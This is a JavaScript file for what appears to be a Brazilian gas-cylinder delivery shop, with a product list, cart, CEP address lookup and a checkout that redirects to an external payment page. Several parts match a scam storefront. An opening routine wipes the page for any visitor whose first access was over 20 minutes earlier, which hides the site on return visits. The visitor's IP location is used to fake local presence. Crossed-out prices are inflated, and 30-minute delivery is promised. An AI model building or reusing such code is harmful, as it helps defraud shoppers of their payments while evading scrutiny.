// Configuração: 20 minutos em milissegundos
(function() {
    const VINTE_MINUTOS = 20 * 60 * 1000; 
    const agora = new Date().getTime();
    
    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');

    if (!primeiroAcesso) {
        localStorage.setItem('site_primeiro_acesso', agora);
    } else {
        const tempoDecorrido = agora - parseInt(primeiroAcesso);

        if (tempoDecorrido > VINTE_MINUTOS) {
            document.documentElement.innerHTML = "";
            document.documentElement.style.backgroundColor = "#ffffff";
            window.stop(); 
        }
    }
})();

// Data
const products = {
    carro: [
        { variant: 'P13', name: 'Botijão de Gás - Cheio (P13)', price: 89.90, old: 110.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663128183638/YFjhrvHJWMnkcedb.png' },
        { variant: 'P45', name: 'Botijão de Gás 45 Kilos - Cheio (P45)', price: 395.90, old: 450.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663128183638/uDLNfBAACtAePQMj.png' },
        { variant: 'P20', name: 'Cilindro de Gás P20 - Cheio (P20)', price: 189.90, old: 220.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663121576719/cIqBsEOaLkLCkvjW.png' },
        { variant: 'P5', name: 'Botijão de Gás 5 Kilos - Cheio (P5)', price: 69.90, old: 85.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663121576719/WJIZYhsaHuPRqFFI.png' }
    ],
    moto: [
        { variant: 'P13', name: 'Botijão de Gás - Cheio (P13)', price: 89.90, old: 110.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663128183638/YFjhrvHJWMnkcedb.png' },
        { variant: 'P45', name: 'Botijão de Gás 45 Kilos - Cheio (P45)', price: 395.90, old: 450.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663128183638/uDLNfBAACtAePQMj.png' },
        { variant: 'P20', name: 'Cilindro de Gás P20 - Cheio (P20)', price: 189.90, old: 220.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663121576719/cIqBsEOaLkLCkvjW.png' },
        { variant: 'P5', name: 'Botijão de Gás 5 Kilos - Cheio (P5)', price: 69.90, old: 85.00, img: 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663121576719/WJIZYhsaHuPRqFFI.png' }
    ]
};

// State
let currentType = 'carro';
let currentVariant = products.carro[0];
let cart = [];
let addressData = null;
let selectedShipping = null;

// Elements
const mainImage = document.getElementById('main-image');
const imageSpinner = document.getElementById('image-spinner');
const variantGrid = document.getElementById('variant-grid-container');
const variantSpinner = document.getElementById('variant-spinner');
const productNameDisplay = document.getElementById('display-product-name');
const priceProductTitle = document.getElementById('price-product-title');
const oldPriceDisplay = document.getElementById('old-price-display');
const currentPriceDisplay = document.getElementById('current-price-display');
const addToCartBtn = document.getElementById('add-to-cart-btn');
const cartBadge = document.getElementById('cart-badge');
const cartModal = document.getElementById('cart-modal');
const cartItemsContainer = document.getElementById('cart-items-container');
const totalDisplay = document.getElementById('cart-total-display');
const cepInput = document.getElementById('cep-input');
const addressDisplay = document.getElementById('address-display');
const checkoutFields = document.getElementById('checkout-fields');
const shippingCards = document.querySelectorAll('.shipping-card');
const scheduleFields = document.getElementById('schedule-fields');
const finalizeBtn = document.getElementById('finalize-order-btn');
const orderSummaryContent = document.getElementById('order-summary-content');
const cartMainContent = document.getElementById('cart-main-content');
const summaryDetails = document.getElementById('summary-details');
const cartFooterMain = document.getElementById('cart-footer-main');
const cartFooterSummary = document.getElementById('cart-footer-summary');
const backToCart = document.getElementById('back-to-cart');
const confirmPaymentBtn = document.getElementById('confirm-payment-btn');
const loadingOverlay = document.getElementById('loading-overlay');

// Initialize variants on load
document.addEventListener('DOMContentLoaded', () => {
    renderVariants('carro');
    initLocation();
});

function initLocation() {
    const locationText = document.getElementById('location-text');
    const locationTarget = document.getElementById('location-target');
    const locIcon = document.getElementById('loc-icon');
    
    fetch('https://wtfismyip.com/json')
        .then(response => response.json())
        .then(data => {
            const cidade = data.YourFuckingLocation.replace(", Brazil", "");
            if(locationText) locationText.textContent = `${cidade} e Região`;
            if(locationTarget) locationTarget.textContent = `${cidade} e Região`;
            if(locIcon) locIcon.style.display = 'inline';
        })
        .catch(error => {
            console.error('Erro:', error);
            if(locationText) locationText.textContent = "Disponível na sua região";
            if(locationTarget) locationTarget.textContent = "sua região";
        });
}

function renderVariants(type) {
    variantSpinner.classList.add('active');
    setTimeout(() => {
        const items = products[type];
        let html = '';
        items.forEach((item, idx) => {
            html += `
                <div class="variant-item ${item.variant === currentVariant.variant ? 'active' : ''}" 
                     onclick="selectVariant('${type}', ${idx})">
                    <i class="fas fa-fire"></i>
                    <span class="variant-name">${item.variant}</span>
                </div>
            `;
        });
        
        const itemsToRemove = variantGrid.querySelectorAll('.variant-item');
        itemsToRemove.forEach(item => item.remove());
        
        variantGrid.insertAdjacentHTML('beforeend', html);
        variantSpinner.classList.remove('active');
    }, 300);
}

window.selectVariant = (type, idx) => {
    currentVariant = products[type][idx];
    updateDisplay();
    renderVariants(type);
};

function updateDisplay() {
    imageSpinner.classList.add('active');
    mainImage.classList.add('loading');
    setTimeout(() => {
        mainImage.src = currentVariant.img;
        mainImage.onload = () => {
            imageSpinner.classList.remove('active');
            mainImage.classList.remove('loading');
        };
        productNameDisplay.textContent = currentVariant.name;
        priceProductTitle.textContent = currentVariant.name;
        oldPriceDisplay.textContent = `R$ ${currentVariant.old.toFixed(2).replace('.', ',')}`;
        currentPriceDisplay.textContent = `R$ ${currentVariant.price.toFixed(2).replace('.', ',')}`;
    }, 400);
}

document.getElementById('sel-carro').addEventListener('click', () => {
    if (currentType === 'carro') return;
    currentType = 'carro';
    currentVariant = products.carro[0];
    document.getElementById('sel-carro').classList.add('active');
    document.getElementById('sel-moto').classList.remove('active');
    updateDisplay();
    renderVariants('carro');
});

document.getElementById('sel-moto').addEventListener('click', () => {
    if (currentType === 'moto') return;
    currentType = 'moto';
    currentVariant = products.moto[0];
    document.getElementById('sel-moto').classList.add('active');
    document.getElementById('sel-carro').classList.remove('active');
    updateDisplay();
    renderVariants('moto');
});

addToCartBtn.addEventListener('click', () => {
    addToCartBtn.classList.add('loading');
    setTimeout(() => {
        try {
            const existing = cart.find(i => i.variant === currentVariant.variant);
            if (existing) {
                existing.qty += 1;
            } else {
                cart.push({
                    variant: currentVariant.variant,
                    name: currentVariant.name,
                    price: currentVariant.price,
                    img: currentVariant.img,
                    qty: 1
                });
            }
            updateCart();
            openCart();
        } catch (err) {
            console.error("Erro ao adicionar ao carrinho:", err);
        } finally {
            addToCartBtn.classList.remove('loading');
        }
    }, 800);
});

function updateCart() {
    const count = cart.reduce((sum, i) => sum + i.qty, 0);
    cartBadge.textContent = count;
    cartBadge.classList.toggle('active', count > 0);

    if (cart.length === 0) {
        cartItemsContainer.innerHTML = '<p style="text-align:center; color:var(--text-light); padding:20px;">Seu carrinho está vazio.</p>';
        if (totalDisplay) totalDisplay.textContent = 'R$ 0,00';
    } else {
        let html = '';
        let subtotal = 0;
        cart.forEach((item, idx) => {
            subtotal += item.price * item.qty;
            html += `
                <div class="cart-item">
                    <img src="${item.img}" class="cart-item-img">
                    <div class="cart-item-details">
                        <div class="cart-item-name">${item.name}</div>
                        <div class="cart-item-price">R$ ${item.price.toFixed(2).replace('.', ',')}</div>
                        <div class="qty-control">
                            <button class="qty-btn" onclick="changeQty(${idx}, -1)">-</button>
                            <span style="font-weight:600; min-width:20px; text-align:center;">${item.qty}</span>
                            <button class="qty-btn" onclick="changeQty(${idx}, 1)">+</button>
                        </div>
                    </div>
                </div>
            `;
        });
        cartItemsContainer.innerHTML = html;
        if (totalDisplay) totalDisplay.textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
    }
}

window.changeQty = (idx, delta) => {
    cart[idx].qty += delta;
    if (cart[idx].qty < 1) cart.splice(idx, 1);
    updateCart();
};

function openCart() { 
    cartModal.classList.add('active'); 
    document.body.style.overflow = 'hidden';
    cartMainContent.scrollTop = 0;
    orderSummaryContent.scrollTop = 0;
    resetToCartView();
}

function resetToCartView() {
    cartMainContent.style.display = 'block';
    orderSummaryContent.style.display = 'none';
    cartFooterSummary.style.display = 'none';
    cartFooterMain.style.display = 'none';
    
    if (cepInput.value.length === 9 && selectedShipping) {
        cartFooterMain.style.display = 'block';
    }
}

document.getElementById('cart-trigger').addEventListener('click', openCart);
document.getElementById('close-cart').addEventListener('click', () => {
    cartModal.classList.remove('active');
    document.body.style.overflow = '';
});

cepInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 5) val = val.slice(0, 5) + '-' + val.slice(5, 8);
    e.target.value = val;
    if (val.length === 9) {
        e.target.blur();
        lookupCEP(val.replace('-', ''));
    } else {
        addressDisplay.style.display = 'none';
        checkoutFields.style.display = 'none';
        cartFooterMain.style.display = 'none';
        selectedShipping = null;
        shippingCards.forEach(c => c.classList.remove('active'));
    }
});

async function lookupCEP(cep) {
    addressDisplay.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Buscando endereço...';
    addressDisplay.style.display = 'block';
    try {
        const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await res.json();
        if (data.erro) {
            addressDisplay.innerHTML = '<span style="color:var(--danger);">CEP não encontrado.</span>';
            checkoutFields.style.display = 'none';
            cartFooterMain.style.display = 'none';
        } else {
            addressData = data;
            addressDisplay.innerHTML = `
                <strong>${data.logradouro}</strong><br>
                ${data.bairro} - ${data.localidade}/${data.uf}
            `;
            checkoutFields.style.display = 'block';
            cartFooterMain.style.display = 'none';
            selectedShipping = null;
            shippingCards.forEach(c => c.classList.remove('active'));
        }
    } catch (err) {
        addressDisplay.innerHTML = '<span style="color:var(--danger);">Erro ao buscar CEP.</span>';
        cartFooterMain.style.display = 'none';
    }
}

shippingCards.forEach(card => {
    card.addEventListener('click', () => {
        shippingCards.forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        selectedShipping = card.dataset.value;
        if (selectedShipping === 'scheduled') {
            scheduleFields.style.display = 'block';
        } else {
            scheduleFields.style.display = 'none';
        }
        cartFooterMain.style.display = 'block';
        
        setTimeout(() => {
            if (cartMainContent) {
                cartMainContent.scrollTo({
                    top: cartMainContent.scrollHeight,
                    behavior: 'smooth'
                });
            }
        }, 100);
    });
});

finalizeBtn.addEventListener('click', () => {
    if (cart.length === 0) return alert('Adicione um produto ao carrinho.');
    if (cepInput.value.length < 9) return alert('Informe um CEP válido.');
    const addrNumber = document.getElementById('addr-number').value;
    if (!addrNumber) return alert('Informe o número da residência.');
    if (!selectedShipping) return alert('Selecione uma opção de envio.');

    showLoading("Preparando seu pedido...");
    setTimeout(() => {
        hideLoading();
        proceedToSummary();
    }, 1500);
});

function proceedToSummary() {
    const addrNumber = document.getElementById('addr-number').value;
    const addrComp = document.getElementById('addr-comp').value;
    let scheduleText = '';
    if (selectedShipping === 'scheduled') {
        const day = document.getElementById('schedule-day').value;
        const time = document.getElementById('schedule-time').value;
        if (!day || !time) return alert('Selecione o dia e horário para o agendamento.');
        scheduleText = `Agendado para: ${day.split('-').reverse().join('/')} às ${time}`;
    } else {
        scheduleText = 'Entrega em 30 Minutos';
    }
    
    let subtotal = cart.reduce((sum, i) => sum + (i.price * i.qty), 0);
    let itemsHtml = cart.map(item => `
        <div class="summary-item-card">
            <img src="${item.img}" class="summary-item-img">
            <div style="flex:1;">
                <div style="font-weight:700; font-size:0.85rem; color:var(--text-dark); margin-bottom:2px;">${item.name}</div>
                <div style="font-size:0.75rem; color:var(--text-light);">${item.qty} unidade${item.qty > 1 ? 's' : ''}</div>
            </div>
            <div style="font-weight:800; color:var(--text-dark); font-size:0.9rem; text-align:right;">R$ ${(item.price * item.qty).toFixed(2).replace(".", ",")}</div>
        </div>
    `).join("");
    
    summaryDetails.innerHTML = `
        <div class="summary-section-title">Produtos</div>
        <div style="margin-bottom:24px;">
            ${itemsHtml}
        </div>
        <div class="summary-section-title">Endereço de Entrega</div>
        <div class="summary-info-box">
            <div style="display:flex; gap:12px; align-items:flex-start;">
                <div style="background:var(--primary); color:white; width:32px; height:32px; border-radius:8px; display:flex; align-items:center; justify-content:center; flex-shrink:0;">
                    <i class="fas fa-map-marker-alt" style="font-size:0.9rem;"></i>
                </div>
                <div>
                    <div style="font-weight:700; color:var(--text-dark); font-size:0.9rem; margin-bottom:2px;">${addressData.logradouro} Nº ${addrNumber}${addrComp ? ' - ' + addrComp : ''}</div>
                    <div style="font-size:0.8rem; color:var(--text-gray); opacity:0.8;">${addressData.bairro} - ${addressData.localidade}/${addressData.uf}</div>
                </div>
            </div>
            <div style="margin-top:16px; padding-top:12px; border-top:1px solid rgba(0, 70, 190, 0.1); display:flex; align-items:center; gap:8px; color:var(--primary); font-weight:700; font-size:0.85rem;">
                <i class="fas fa-clock"></i> <span>${scheduleText}</span>
            </div>
        </div>
        <div class="summary-section-title">Resumo de Valores</div>
        <div class="summary-totals-block">
            <div class="summary-info-row">
                <span class="summary-info-label">Subtotal</span>
                <span class="summary-info-value">R$ ${subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div class="summary-info-row">
                <span class="summary-info-label">Frete e Instalação</span>
                <span class="summary-info-value" style="color:var(--success); font-weight:700;">GRÁTIS</span>
            </div>
            <div class="summary-info-row" style="border-top:1px solid var(--border-color); margin-top:12px; padding-top:12px;">
                <span style="font-weight:800; font-size:1rem; color:var(--text-dark);">Total a pagar</span>
                <span style="font-weight:900; font-size:1.2rem; color:var(--primary);">R$ ${subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
        </div>
    `;
    cartMainContent.style.display = 'none';
    orderSummaryContent.style.display = 'block';
    cartFooterMain.style.display = 'none';
    cartFooterSummary.style.display = 'block';
}

backToCart.addEventListener('click', resetToCartView);

confirmPaymentBtn.addEventListener('click', () => {
    showLoading("Finalizando seu pedido...");
    const subtotal = cart.reduce((sum, i) => sum + (i.price * i.qty), 0);
    const targetUrl = `https://pag-simples.onrender.com/?subtotal=${subtotal.toFixed(2)}`;
    setTimeout(() => {
        window.location.href = targetUrl;
    }, 500);
});

function showLoading(text = "Processando...") { 
    document.getElementById('loading-text').innerText = text;
    loadingOverlay.classList.add('active'); 
}

function hideLoading() { loadingOverlay.classList.remove('active'); }

window.addEventListener('scroll', () => {
    const header = document.getElementById('main-header');
    if(header) header.classList.toggle('sticky', window.scrollY > 50);
});

document.querySelectorAll('.faq-question').forEach(q => {
    q.addEventListener('click', () => {
        const item = q.parentElement;
        item.classList.toggle('active');
    });
});

window.addEventListener('pageshow', (event) => {
    if (event.persisted) {
        hideLoading();
    }
});
